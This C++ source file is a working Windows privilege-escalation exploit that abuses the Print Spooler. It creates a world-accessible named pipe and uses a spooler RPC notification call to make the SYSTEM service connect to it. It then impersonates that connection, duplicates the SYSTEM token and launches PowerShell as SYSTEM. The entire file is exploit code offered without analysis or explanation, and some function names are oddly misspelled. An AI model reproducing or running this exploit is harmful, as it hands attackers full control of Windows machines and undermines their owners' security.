#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>

#include "ps.h"
#include "m_s-rp_rn_h.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! this is the -i flag
BOOL g_bInteractWithConsole = TRUE;

DWORD g_dwSessionId = 0;
LPWSTR g_pwszCommandLine = NULL;

int wmain(int argc, wchar_t** argv)
{
	//g_pwszCommandLine = argv[1];
	return DoMain();
}

DWORD DoMain()
{
	//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! this is the -c command
	std::string command = "powershell.exe";
	g_pwszCommandLine = ConvStr(command);

	LPWSTR pwsz_Pipe_Name = NULL;
	HANDLE h_Spool_Pipe = INVALID_HANDLE_VALUE;
	HANDLE h_Spool_Pipe_Event = INVALID_HANDLE_VALUE;
	HANDLE h_Spool_Trigger_Thread = INVALID_HANDLE_VALUE;
	DWORD dw_Wait = 0;

	if (!Gen_Rand_Pipe_Name(&pwsz_Pipe_Name))
	{
		goto cleanup;
	}
	if (!(h_Spool_Pipe = Create_Spool_Named_Pipe(pwsz_Pipe_Name)))
	{
		goto cleanup;
	}
	if (!(h_Spool_Pipe_Event = Cnct_Spool_Named_Pipe(h_Spool_Pipe)))
	{
		goto cleanup;
	}

	if (!(h_Spool_Trigger_Thread = Trigger_Named_Pipe_Conn(pwsz_Pipe_Name)))
	{
		goto cleanup;
	}
	dw_Wait = WaitForSingleObject(h_Spool_Pipe_Event, 5000);
	if (dw_Wait != WAIT_OBJECT_0)
	{
		goto cleanup;
	}

	Gett_System(h_Spool_Pipe);

cleanup:
	if (h_Spool_Pipe)
		CloseHandle(h_Spool_Pipe);
	if (h_Spool_Pipe_Event)
		CloseHandle(h_Spool_Pipe_Event);
	if (h_Spool_Trigger_Thread)
		CloseHandle(h_Spool_Trigger_Thread);

	return 0;
}

LPWSTR ConvStr(const std::string& instr)
{
	// Assumes std::string is encoded in the current Windows ANSI codepage
	int bufferlen = ::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0);

	if (bufferlen == 0)
	{
		// Something went wrong. Perhaps, check GetLastError() and log.
		return 0;
	}

	// Allocate new LPWSTR - must deallocate it later
	LPWSTR widestr = new WCHAR[bufferlen + 1];

	::MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), widestr, bufferlen);

	// Ensure wide string is null terminated
	widestr[bufferlen] = 0;

	// Do something with widestr
	return widestr;
	//delete[] widestr;
}

BOOL Gen_Rand_Pipe_Name(LPWSTR *p_pwsz_Pipe_Name)
{
	UUID uu_id = { 0 };
	if (UuidCreate(&uu_id) != RPC_S_OK)
		return FALSE;
	if (UuidToString(&uu_id, (RPC_WSTR*)&(*p_pwsz_Pipe_Name)) != RPC_S_OK)
		return FALSE;
	if (!*p_pwsz_Pipe_Name)
		return FALSE;
	return TRUE;
}

HANDLE Create_Spool_Named_Pipe(LPWSTR pwszPipeName)
{
	HANDLE h_Pipe = NULL;
	LPWSTR pwsz_Pipe_Full_name = NULL;
	SECURITY_DESCRIPTOR s_d = { 0 };
	SECURITY_ATTRIBUTES s_a = { 0 };

	pwsz_Pipe_Full_name = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwsz_Pipe_Full_name)
		return NULL;

	StringCchPrintf(pwsz_Pipe_Full_name, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pwszPipeName);

	if (!InitializeSecurityDescriptor(&s_d, SECURITY_DESCRIPTOR_REVISION))
	{
		free(pwsz_Pipe_Full_name);
		return NULL;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&s_a)->lpSecurityDescriptor), NULL))
	{
		free(pwsz_Pipe_Full_name);
		return NULL;
	}

	// The FILE_FLAG_OVERLAPPED flag is what allows us to create an async pipe.
	h_Pipe = CreateNamedPipe(pwsz_Pipe_Full_name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &s_a);
	if (h_Pipe == INVALID_HANDLE_VALUE)
	{
		free(pwsz_Pipe_Full_name);
		return NULL;
	}

	free(pwsz_Pipe_Full_name);

	return h_Pipe;
}

HANDLE Cnct_Spool_Named_Pipe(HANDLE hPipe)
{
	HANDLE h_Pipe_Event = INVALID_HANDLE_VALUE;
	OVERLAPPED o_l = { 0 };

	// Create a non-signaled event for the OVERLLAPED structure
	h_Pipe_Event = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!h_Pipe_Event)
	{
		return NULL;
	}

	ZeroMemory(&o_l, sizeof(OVERLAPPED));
	o_l.hEvent = h_Pipe_Event;

	// Connect the pipe asynchronously
	if (!ConnectNamedPipe(hPipe, &o_l))
	{
		if (GetLastError() != ERROR_IO_PENDING)
		{
			return NULL;
		}
	}

	return h_Pipe_Event;
}

HANDLE Trigger_Named_Pipe_Conn(LPWSTR pwszPipeName)
{
	HANDLE h_Thread = NULL;
	DWORD dw_Thread_Id = 0;

	h_Thread = CreateThread(NULL, 0, Trigger_Namd_Pipe_Conn_Thread, pwszPipeName, 0, &dw_Thread_Id);

	return h_Thread;
}

DWORD WINAPI Trigger_Namd_Pipe_Conn_Thread(LPVOID lpParam)
{
	HRESULT h_r = NULL;
	PRINTER_HANDLE h_Printer = NULL;
	DEVMODE_CONTAINER dev_mode_Container = { 0 };

	LPWSTR pwsz_Computer_Name = NULL;
	DWORD dw_Computer_Name_Len = MAX_COMPUTERNAME_LENGTH + 1;

	LPWSTR pwsz_Targt_Srvr = NULL;
	LPWSTR pwsz_Captur_Srvr = NULL;

	LPWSTR pwsz_Pipe_Name = (LPWSTR)lpParam;

	pwsz_Computer_Name = (LPWSTR)malloc(dw_Computer_Name_Len * sizeof(WCHAR));
	if (!pwsz_Computer_Name)
		goto cleanup;

	if (!GetComputerName(pwsz_Computer_Name, &dw_Computer_Name_Len))
		goto cleanup;

	pwsz_Targt_Srvr = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwsz_Targt_Srvr)
		goto cleanup;

	pwsz_Captur_Srvr = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwsz_Captur_Srvr)
		goto cleanup;

	StringCchPrintf(pwsz_Targt_Srvr, MAX_PATH, L"\\\\%ws", pwsz_Computer_Name);
	StringCchPrintf(pwsz_Captur_Srvr, MAX_PATH, L"\\\\%ws/pipe/%ws", pwsz_Computer_Name, pwsz_Pipe_Name);

	RpcTryExcept
	{
		if (RpcOpenPrinter(pwsz_Targt_Srvr, &h_Printer, NULL, &dev_mode_Container, 0) == RPC_S_OK)
		{
			RpcRemoteFindFirstPrinterChangeNotificationEx(h_Printer, PRINTER_CHANGE_ADD_JOB, 0, pwsz_Captur_Srvr, 0, NULL);
			RpcClosePrinter(&h_Printer);
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		// Expect RPC_S_SERVER_UNAVAILABLE
	}
	RpcEndExcept;

cleanup:
	if (pwsz_Computer_Name)
		free(pwsz_Computer_Name);
	if (pwsz_Targt_Srvr)
		free(pwsz_Targt_Srvr);
	if (pwsz_Captur_Srvr)
		free(pwsz_Captur_Srvr);
	if (h_Printer)
		RpcClosePrinter(&h_Printer);

	return 0;
}

BOOL Gett_System(HANDLE hPipe)
{
	BOOL b_Result = FALSE;
	HANDLE h_System_Token = INVALID_HANDLE_VALUE;
	HANDLE h_System_Token_Dup = INVALID_HANDLE_VALUE;

	DWORD dw_Creation_Flags = 0;
	LPWSTR pwsz_Curr_Dir = NULL;
	LPVOID lp_Env = NULL;
	PROCESS_INFORMATION p_i = { 0 };
	STARTUPINFO s_i = { 0 };

	if (!ImpersonateNamedPipeClient(hPipe)) 
	{
		goto cleanup;
	}

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &h_System_Token))
	{
		goto cleanup;
	}

	if (!DuplicateTokenEx(h_System_Token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &h_System_Token_Dup))
	{
		goto cleanup;
	}

	if (g_dwSessionId)
	{
		if (!SetTokenInformation(h_System_Token_Dup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
		{
			goto cleanup;
		}
	}
	
	dw_Creation_Flags = CREATE_UNICODE_ENVIRONMENT;
	dw_Creation_Flags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwsz_Curr_Dir = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwsz_Curr_Dir, MAX_PATH))
	{
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lp_Env, h_System_Token_Dup, FALSE))
	{
		goto cleanup;
	}

	ZeroMemory(&s_i, sizeof(STARTUPINFO));
	s_i.cb = sizeof(STARTUPINFO);
	s_i.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

	if (!CreateProcessAsUser(h_System_Token_Dup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dw_Creation_Flags, lp_Env, pwsz_Curr_Dir, &s_i, &p_i))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{

			RevertToSelf();

			if (!g_bInteractWithConsole)
			{
				if (!CreateProcessWithTokenW(h_System_Token_Dup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dw_Creation_Flags, lp_Env, pwsz_Curr_Dir, &s_i, &p_i))
				{
					goto cleanup;
				}
				else
				{
				}
			}
			else
			{
				goto cleanup;
			}
		}
		else
		{
			goto cleanup;
		}
	}
	else
	{
		wprintf(L"OK\n");
	}

	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(p_i.hProcess, INFINITE);
	}

	b_Result = TRUE;

cleanup:
	if (h_System_Token)
		CloseHandle(h_System_Token);
	if (h_System_Token_Dup)
		CloseHandle(h_System_Token_Dup);
	if (pwsz_Curr_Dir)
		free(pwsz_Curr_Dir);
	if (lp_Env)
		DestroyEnvironmentBlock(lp_Env);
	if (p_i.hProcess)
		CloseHandle(p_i.hProcess);
	if (p_i.hThread)
		CloseHandle(p_i.hThread);

	return b_Result;
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS Rpc_Stat;
	RPC_WSTR Str_Binding;
	handle_t Bind_Handle;

	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &Str_Binding) != RPC_S_OK)
		return NULL;

	Rpc_Stat = RpcBindingFromStringBindingW(Str_Binding, &Bind_Handle);

	RpcStringFreeW(&Str_Binding);

	if (Rpc_Stat != RPC_S_OK)
		return NULL;

	return Bind_Handle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
